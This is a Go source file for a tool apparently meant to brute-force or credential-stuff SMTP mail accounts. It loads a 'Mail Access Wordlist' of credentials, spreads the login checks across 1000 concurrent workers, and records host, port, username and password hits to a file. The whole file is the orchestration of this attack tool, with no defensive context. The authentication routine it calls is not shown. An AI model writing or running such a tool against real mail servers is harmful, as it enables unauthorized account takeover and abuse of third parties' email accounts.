package smtpbrute

import (
	"fmt"
	"strings"
	"sync"

	"github.com/fatih/color"
	"github.com/ncruces/zenity"
)

func BruteSmtp() {
	var testEmail string
	fmt.Print("Enter test email :> ")
	fmt.Scanln(&testEmail)
	fmt.Println("Select your wordlist: ")
	filePath, err := zenity.SelectFile(
		zenity.FileFilters{
			{Name: "Mail Access Wordlist", Patterns: []string{"*.txt"}, CaseFold: false},
		})
	if err != nil {
		fmt.Printf("err: %v\n", err)
	}
	fmt.Printf("filePath: %v\n", filePath)
	wordList, _ := ReadCredsFromFile(filePath)
	testEmail = strings.TrimSpace(testEmail)

	red := color.New(color.FgRed).PrintlnFunc()
	red("SMTP Host\tPort\tUsername\t\tPassword")
	red("-------------------------------------------------------------------")

	var wg sync.WaitGroup
	var mutex sync.Mutex
	var results []string

	maxWorkers := 1000
	chunkSize := len(wordList) / maxWorkers

	if len(wordList)%maxWorkers != 0 {
		chunkSize++
	}
	wordListChunks := make(chan []string, chunkSize)

	// spawn goroutines which will be reading data from the ipChunks channel concurrently.
	for i := 0; i < maxWorkers; i++ {
		wg.Add(1)
		go ProcessCredentials(wordListChunks, i, testEmail, &results, &mutex, &wg)
	}

	// share wordlist among goroutines by sending calculated chunk data size to worker channel.
	for i := 0; i < len(wordList); i += chunkSize {
		end := i + chunkSize
		if end > len(wordList) {
			end = len(wordList)
		}
		wordListChunks <- wordList[i:end]
	}
	fmt.Printf("len(wordListChunks): %v\n", len(wordListChunks))
	close(wordListChunks)

	wg.Wait()
	WriteResultsToFile(results)
	fmt.Println("all checks are done!")
}
